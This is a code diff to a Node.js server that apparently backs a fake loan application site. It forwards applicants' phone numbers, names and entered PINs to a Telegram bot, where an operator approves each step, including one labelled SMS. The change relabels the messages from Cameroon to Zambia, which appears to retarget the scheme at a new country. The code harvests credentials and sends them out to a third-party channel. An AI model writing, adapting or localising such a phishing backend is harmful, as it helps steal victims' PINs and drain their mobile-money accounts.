@@ -185,7 +185,7 @@ app.post('/api/send-application', async (req, res) => {
         
         console.log(`📝 Application ${isResubmission ? 'RE' : ''}submitted: ${applicationId}`);
 
-        const message = `📋 *${isResubmission ? 'RE-' : 'NEW'} LOAN APPLICATION (CAMEROON)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +260${phone}\n💰 Amount: XAF ${loanAmount.toLocaleString()}\n📅 Term: ${loanTerm}\n👤 Name: ${firstName} ${lastName}\n${isResubmission ? `\n🔄 Resubmission #${applications[applicationId].resubmissionCount}` : ''}\n\n✅ *Please approve or reject this application:*`;
+        const message = `📋 *${isResubmission ? 'RE-' : 'NEW'} LOAN APPLICATION (ZAMBIA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +260${phone}\n💰 Amount: ZMW ${loanAmount.toLocaleString()}\n📅 Term: ${loanTerm}\n👤 Name: ${firstName} ${lastName}\n${isResubmission ? `\n🔄 Resubmission #${applications[applicationId].resubmissionCount}` : ''}\n\n✅ *Please approve or reject this application:*`;
         
         const buttons = [[
             { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
@@ -424,7 +424,7 @@ app.post('/api/send-final-details', async (req, res) => {
         applications[data.applicationId].updatedAt = new Date().toISOString();
         saveApplications();
 
-        const message = `✅ *LOAN COMPLETE (CAMEROON)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${data.applicationId}\n📱 Phone: +260${data.phone}\n🔑 PIN Entered: ${data.pin}\n💰 Amount: ZMW ${data.loanAmount.toLocaleString()}\n📅 Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n🎉 *Status: DASHBOARD ACCESS GRANTED*`;
+        const message = `✅ *LOAN COMPLETE (ZAMBIA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${data.applicationId}\n📱 Phone: +260${data.phone}\n🔑 PIN Entered: ${data.pin}\n💰 Amount: ZMW ${data.loanAmount.toLocaleString()}\n📅 Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n🎉 *Status: DASHBOARD ACCESS GRANTED*`;
 
         await sendTelegramMessage(message);
         res.json({ ok: true, status: 'dashboard_ready' });
@@ -655,7 +655,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 });
                 
                 const statusText = action === 'YES' ? '✅ Approved' : '❌ Rejected';
-                await sendTelegramMessage(`📌 *Status Update (CAMEROON)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📋 Step: ${step}\n📌 Status: ${statusText}`);
+                await sendTelegramMessage(`📌 *Status Update (ZAMBIA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📋 Step: ${step}\n📌 Status: ${statusText}`);
                 
             } catch (parseError) {
                 console.error('❌ Error parsing callback data:', parseError);
